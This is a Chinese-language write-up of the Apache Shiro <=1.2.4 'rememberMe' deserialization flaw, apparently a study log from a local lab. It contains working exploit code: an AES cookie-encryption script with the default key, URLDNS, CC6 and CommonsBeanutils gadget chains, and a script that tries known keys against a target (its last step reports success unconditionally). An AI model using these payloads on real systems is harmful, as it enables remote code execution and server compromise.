# 前言
环境：
- jdk8u65
- [Tomcat8](https://tomcat.apache.org/download-80.cgi)
- shiro 1.2.4
漏洞影响版本：Shiro <= 1.2.4



本文是初次接触shiro，更偏向尽量从未知的前提下去发现漏洞点，所以我们寻找漏洞点的过程并不直接，但代表个人的思考过程。
# 漏洞点分析

漏洞的根本原因是因为使用固定密钥进行对称加密
漏洞的启发点在于
当我们登录选rememberme的时候，会生成一个超长很像base64加密的一个cookie
这么长的cookie启发我们也许cookie中装着一些信息，可能包括一些身份信息。
所以我们在源码中搜索有关cookie的东西
发现了一个类叫`CookieRememberMeManager`
看着就很靠谱
![[Pasted image 20251216152841.png]]

在这里我们可以看到几个比较敏感的方法
例如`setCookie`  `rememberSerializedIdentity`    `getRememberedSerializedIdentity`
其实很明显， `rememberSerializedIdentity`    `getRememberedSerializedIdentity`



 `rememberSerializedIdentity`   应该就是我们往服务器里存储一个用户的信息的方法
事实上，我们猜测的没错，向上查找到`rememberIdentity`,接着一层一层向上找，我们最终会找到如下图所示
可以确定，这里的实现的功能就是我们还没有携带cookie第一次登录的时候勾选rememberme之后往服务器存储我们身份信息的一个过程
![[Pasted image 20251216160127.png]]

`getRememberedSerializedIdentity`应该就是我们恢复一个对象的过程
我们向上查找调用找到`getRememberedPrincipals`跟刚刚非常像，还是一步一步向上查找
![[Pasted image 20251216161012.png]]
找到了一个`convertBytesToPrincipals()`
![[Pasted image 20251216161213.png]]
这里就很像了，有解密，有反序列化。
![[Pasted image 20251216161354.png]]

# 反序列化
可以看到这里的反序列化中会调用

![[Pasted image 20251216183111.png]]![[Pasted image 20251216193014.png]]
在这里调用了readObject()，是一个完美的反序列化入口点
![[Pasted image 20251216193028.png]]
## 解密
跟进decrypt
发现了这个getDecryptionCipherKey  --获取解密密钥
![[Pasted image 20251216161557.png]]
跟进，发现返回了一个属性`decryptionCipherKey`
我们看看这个属性是如和赋值的？
![[Pasted image 20251216161711.png]]

![[Pasted image 20251216161815.png]]
依然向上查找`setDecryptionCipherKey()`->`setCipherKey()`->`AbstractRememberMeManager()`

![[Pasted image 20251216161839.png]]
ok找到了。
发现密钥竟然是一个定值
`kPH+bIxk5D2deZiIxcaaaA==`
![[Pasted image 20251216161934.png]]
![[Pasted image 20251216162005.png]]

```java
/**  
 * The following Base64 string was generated by auto-generating an AES Key: * <pre>  
 * AesCipherService aes = new AesCipherService();  
 * byte[] key = aes.generateNewKey().getEncoded(); * String base64 = Base64.encodeToString(key); * </pre>  
 * The value of 'base64' was copied-n-pasted here:  
 */
```

其实在这里，他也写了是aes加密


那我们的思路明确，服务器检测身份的途径是通过先把cookie中的字段base64解密，aes解密，进行反序列化
这里反序列化就会触发我们的链子。

# exp

首先把aes加密并base64加密的脚本粘贴出来
```python
# －*-* coding:utf-8  
# @Time    :  2022/7/13 17:36  
# @Author  : Drunkbaby  
# @FileName: poc.py  
# @Software: VSCode  
# @Blog    ：https://drun1baby.github.io/  
  
from email.mime import base  
from pydoc import plain  
import sys  
import base64  
from turtle import mode  
import uuid  
from random import Random  
from Crypto.Cipher import AES  
  
  
def get_file_data(filename):  
    with open(filename, 'rb') as f:  
        data = f.read()  
    return data  
  
  
def aes_enc(data):  
    BS = AES.block_size  
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()  
    key = "kPH+bIxk5D2deZiIxcaaaA=="  
    mode = AES.MODE_CBC  
    iv = uuid.uuid4().bytes  
    encryptor = AES.new(base64.b64decode(key), mode, iv)  
    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))  
    return ciphertext  
  
  
def aes_dec(enc_data):  
    enc_data = base64.b64decode(enc_data)  
    unpad = lambda s: s[:-s[-1]]  
    key = "kPH+bIxk5D2deZiIxcaaaA=="  
    mode = AES.MODE_CBC  
    iv = enc_data[:16]  
    encryptor = AES.new(base64.b64decode(key), mode, iv)  
    plaintext = encryptor.decrypt(enc_data[16:])  
    plaintext = unpad(plaintext)  
    return plaintext  
  
  
if __name__ == "__main__":  
    data = get_file_data("ser.bin")  
    print(aes_enc(data))
```
打依赖的时候我们需要注意可以打什么依赖

依赖的作用域是不一样的，我们在pom.xml这里可以通过插件看到依赖的作用域
![[Pasted image 20251216194607.png]]
简单提一下、
## 作用域
### `compile` (默认作用域)

这是最常用、最重要的作用域，如果没有明确指定，则默认为此作用域。
- **编译 (Compile):** **可用。** 参与项目的编译过程。
- **测试 (Test):** **可用。** 参与测试代码的编译和运行。
- **运行 (Runtime):** **可用。** 参与项目的实际运行。
- **传递性 (Transitive):** **强传递。** 依赖此项目的其他项目也会自动依赖这个 `compile` 范围的包。
无论在哪个阶段都需要用到，并且应该作为项目 API 的一部分提供给依赖它的其他项目。
### `provided`

- **编译 (Compile):** **可用。** 参与项目的编译过程。
- **测试 (Test):** **可用。** 参与测试代码的编译和运行。
- **运行 (Runtime):** **不可用。** **不会**被打包到最终的 WAR/JAR 文件中。因为它假定运行环境（如 Servlet 容器或应用服务器）已经提供了此依赖。
- **传递性 (Transitive):** **不传递。** 依赖此项目的其他项目不会自动获得此依赖。
编译时需要，但运行时由容器或 JDK 提供。可以有效减小最终部署包的体积。

### `runtime`
与 `provided` 几乎相反的作用域。
- **编译 (Compile):** **不可用。** 不会参与编译，因为编译时只需要接口，不需要具体实现。
- **测试 (Test):** **可用。** 参与测试代码的编译和运行。
- **运行 (Runtime):** **可用。** 参与项目的实际运行。
- **传递性 (Transitive):** **弱传递。** 依赖此项目的其他项目在运行时需要，但编译时不需要。
- **常见示例:** JDBC 驱动的实现（如 MySQL Connector），Log4j 的实现（如 Logback 或 Log4j Core）。
 编译时不需要，运行时才需要。通常用于依赖接口但运行时需要具体实现的场景。
### `test`
专门用于测试代码的作用域。
- **编译 (Compile):** **不可用。** 主代码的编译不依赖它。
- **测试 (Test):** **可用。** 参与测试代码的编译和运行。
- **运行 (Runtime):** **不可用。** 不会参与项目的实际运行。
- **传递性 (Transitive):** **不传递。**
- **常见示例:** JUnit, Mockito, TestNG。
只在测试阶段生效，与生产环境代码完全隔离。

所以`provided`的`test`的依赖我们是打不了的。

## 打链子

### URLDNS链子

```java
package com.example.demo;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.net.URL;  
import java.util.HashMap;  
  
public class URLDNS {  
    public static void main(String[] args) throws Exception{  
        HashMap<URL,Integer> hashmap= new HashMap<URL,Integer>();  
        // 这里不要发起请求  
        URL url = new URL("http://sbdusk.c5zcfi2k.requestrepo.com");  
        Class c = url.getClass();  
        Field hashcodefile = c.getDeclaredField("hashCode");  
        hashcodefile.setAccessible(true);  
        hashcodefile.set(url,1234);  
        hashmap.put(url,1);  
        // 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  
        hashcodefile.set(url,-1);  
        serialize(hashmap);  
        //unserialize("ser.bin");  
    }  
  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```
把ser.bin拿到我们脚本跑一下即可

可以看到我们收到了这个dns请求
![[Pasted image 20251216141232.png]]
![[Pasted image 20251216140942.png]]


### CC6
最开始我直接打的cc6加载字节码的版本，也就是无数组，这个确实比较好用，直接就打通了，看了白日梦组长的视频，发现其中有一些问题
先粘一张执行成功的截屏
![[Pasted image 20251216200211.png]]

我们先来看一下他的反序列化是如何实现的
```java
public T deserialize(byte[] serialized) throws SerializationException {  
    if (serialized == null) {  
        String msg = "argument cannot be null.";  
        throw new IllegalArgumentException(msg);  
    }  
    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);  
    BufferedInputStream bis = new BufferedInputStream(bais);  
    try {  
        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);  
        @SuppressWarnings({"unchecked"})  
        T deserialized = (T) ois.readObject();  
        ois.close();  
        return deserialized;  
    } catch (Exception e) {  
        String msg = "Unable to deserialze argument byte array.";  
        throw new SerializationException(msg, e);  
    }
```
我们粘一个我们原来的反序列化实现来玩找不同
```java
public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
    ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
    Object obj=ois.readObject();  
    return obj;  
}
```

可以看到shiro的反序列化前面都是一样的
```java
ByteArrayInputStream bais = new ByteArrayInputStream(serialized);  
BufferedInputStream bis = new BufferedInputStream(bais);
//----------------------相当于下面这句
ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));
```
但是shiro比正常的多套了一层`ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);`进去看看
这里一个构造函数和一个重写的类加载的方法`resolveClass`
![[Pasted image 20251216203804.png]]
对比一下原生的
```java
//原生版本
protected Class<?> resolveClass(ObjectStreamClass desc)  
    throws IOException, ClassNotFoundException  
{  
    String name = desc.getName();  
    try {  
        return Class.forName(name, false, latestUserDefinedLoader());  
    } catch (ClassNotFoundException ex) {  
        Class<?> cl = primClasses.get(name);  
        if (cl != null) {  
            return cl;  
        } else {  
            throw ex;  
        }  
    }  
}
```
```java
//重写版本
@Override  
protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {  
    try {  
        return ClassUtils.forName(osc.getName());  
    } catch (UnknownClassException e) {  
        throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", e);  
    }  
}
```
继续找不同，发现重写版本用的是` ClassUtils.forName(osc.getName());`
原版是`Class.forName()`
所以我们跟进`ClassUtils`看看吧
可以看到这里类似双亲委派机制，先调用线程上下文的类加载器、再调用当前类的类加载器、最后自去找系统的类加载器
`classloader.loadClass()`底层是不能加载数组类的
如果想像java原生类加载器一样来加载数组的话需要使用`java.lang.Class.forName()`来加载一个数组
![[Pasted image 20251216204338.png]]
从这里我们可以看出，shiro的`forName()`底层走的是`classloader.loadclass()`并非原生的`java.lang.Class.forName()`
![[Pasted image 20251216210141.png]]
所以我们搞清楚了为什么这里不能加载数组
所以我们构造的exp不能走下面这个，得走加载字节码的那个。
  
```
Transformer[] transformers = new Transformer[]{  
        new ConstantTransformer(Runtime.class),  
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
};
```

### CB1
原生shiro中是没有CC依赖的，带的是CB，所以这里我们学习一下怎么打CB
CB类似CC 也是对java的一个增强
CC是对java集合类的一个增强
CB是对JavaBean的增强

JavaBean就是一个定义
Java中很多class的定义都符合这样的规范：
- 若干`private`实例字段
- 通过`public`方法来`set get`字段
例如
```java
private String name;  
private int age;  
  
public String getNameee(){return this.name;}  
public void setName(String name){this.name=name;}  
  
public int getAge(){return this.age;}  
public void  setAge(int age){ this.age=age;}
```
这种规范的代码就叫`javabean`

正常来说没有CB依赖的时候，如果我们想调用上面的名字属性
那我们必须要执行`getName()`方法

但是CB帮我们封装好了一个函数叫`PropertyUtils.getProperty()`
`PropertyUtils.getProperty(Object，"nameee")`第一个参数是要获取的对象，第二个是要获取对象的属性名。`PropertyUtils`是属性工具的意思`getProperty`就是获取属性的意思

通过打断点或者测试的方式，我们可以发现这个CB的底层实现`getProperty`
我们的方法名，必须是get或set开头，后面的属性名，必须第一个字母大写，规范命名格式
`getProperty`中传入的参数名字和方法中getXXXX的XXXX要对应
例如：方法名为`getNameeee`，那我们传入参数就必须为`nameeee`


就很像反射修改一个私有属性嘛。所以，我们可以查找调用，看看谁调用了`getProperty`
这个transform是没继承序列化接口的，我们找找，看到了compare，我们CC2中有一环就是调用了`compare()`方法，并且`Object value1 = PropertyUtils.getProperty( o1, property );`
这里两个参数我们都能控制，完美
![[Pasted image 20251217180201.png]]

所以，我们刚刚说了，只要形如getXXXXX或者setXXXXX的方法，我们都可以通过
`PropertyUtils.getProperty( Object，"XXXXX" );`来调用。


这时，我们看我们加载字节码的CC链我们最终是通过触发`TemplatesImpl.newTransformer();`进而触发加载恶意字节码。
其中还有一个方法叫`getOutputProperties()`里面同样调用了`newTransformer()`那么现在，我们就可以完美触发我们的链子了！
![[Pasted image 20251217191934.png]]

总结一下
`PriorityQueue.readObject()`->`BeanComparator.compare()`->`PropertyUtils.getProperty()`->`TemplatesImpl.getOutputProperties()`->`TemplatesImpl.newTransformer()`

最终触发我们的链子
也就是CC2(入口)->CB(`BeanComparator.compare()`)->加载字节码的`newTransformer()`->字节码



exp:
```java
package org.example;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.beanutils.BeanComparator;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class BeanTest {  
    public static void main(String[] args) throws Exception{  
        //反射  
        TemplatesImpl templates = new TemplatesImpl();  
        Class<? extends TemplatesImpl> getclass = templates.getClass();  
        //_name赋值  
        Field name = getclass.getDeclaredField("_name");  
        name.setAccessible(true);  
        name.set(templates,"anything");  
        //_bytecodes赋值  
        Field bytecodes = getclass.getDeclaredField("_bytecodes");  
        bytecodes.setAccessible(true);  
        byte[] bytes = Files.readAllBytes(Paths.get("E:\\load\\IDEA\\code\\CC1\\target\\classes\\com\\example\\demo\\CC\\CC3\\Test.class"));  
        byte[][] bytes1 ={bytes};  
        bytecodes.set(templates,bytes1);  
        //_tfactory赋值  
        Field tfactory = getclass.getDeclaredField("_tfactory");  
        tfactory.setAccessible(true);  
        tfactory.set(templates,new TransformerFactoryImpl());  
  
  
        BeanComparator beanComparator = new BeanComparator();  
  
        PriorityQueue<Object> evilObject = new PriorityQueue<>(2,beanComparator);//comparator=TransformingComparator  
  
  
        //反射修改beanComparator  
        Field property = BeanComparator.class.getDeclaredField("property");  
        property.setAccessible(true);  
        property.set(beanComparator,"outputProperties");  
  
        //反射修改优先队列的queue属性，这样能把o1，o2传进去  
        Field queue = PriorityQueue.class.getDeclaredField("queue");  
        queue.setAccessible(true);  
        queue.set(evilObject,new Object[]{templates,templates});  
  
        //反射修改size  
  
        Field size = PriorityQueue.class.getDeclaredField("size");  
        size.setAccessible(true);  
        size.set(evilObject,2);  
  
  
        serialize(evilObject);  
        //unserialize("ser.bin");  
  
    }  
  
    public  static void serialize(Object obj)throws Exception{  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
  
    }  
    public  static  Object unserialize(String Filename)throws IOException,ClassNotFoundException{  
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));  
        Object obj=ois.readObject();  
        return obj;  
    }  
}
```
![[Pasted image 20251217194911.png]]



# 后记
shiro 1.2.4以上版本，官方移除了代码中的默认密钥，要求开发者自己设置，若未设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。

那么如何判断密钥是否正确呢？文章 [一种另类的 shiro 检测方式](https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect)提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 `Set-Cookie：rememberMe=deleteMe` 字段，而当密钥正确且没有类型转换异常时，返回包不存在 `Set-Cookie：rememberMe=deleteMe` 字段。

因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。

shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。

这里给出大佬 Veraxy 的脚本：

```python
import base64
import uuid
import requests
from Crypto.Cipher import AES
 
def encrypt_AES_GCM(msg, secretKey):
    aesCipher = AES.new(secretKey, AES.MODE_GCM)
    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
    return (ciphertext, aesCipher.nonce, authTag)
 
def encode_rememberme(target):
    keys = ['kPH+bIxk5D2deZiIxcaaaA==', '4AvVhmFLUs0KTA3Kprsdag==','66v1O8keKNV3TTcGPK1wzg==', 'SDKOLKn2J1j/2BHjeZwAoQ==']     # 此处简单列举几个密钥
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
 
    file_body = base64.b64decode('rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==')
    for key in keys:
        try:
            # CBC加密
            encryptor = AES.new(base64.b64decode(key), mode, iv)
            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))
            res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()},timeout=3,verify=False, allow_redirects=False)
            if res.headers.get("Set-Cookie") == None:
                print("正确KEY ：" + key)
                return key
            else:
                if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                    print("正确key:" + key)
                    return key
            # GCM加密
            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))
            base64_ciphertext = base64.b64encode(encryptedMsg[1] + encryptedMsg[0] + encryptedMsg[2])
            res = requests.get(target, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, allow_redirects=False)
 
            if res.headers.get("Set-Cookie") == None:
                print("正确KEY:" + key)
                return key
            else:
                if 'rememberMe=deleteMe;' not in res.headers.get("Set-Cookie"):
                    print("正确key:" + key)
                    return key
            print("正确key:" + key)
            return key
        except Exception as e:
            print(e)
```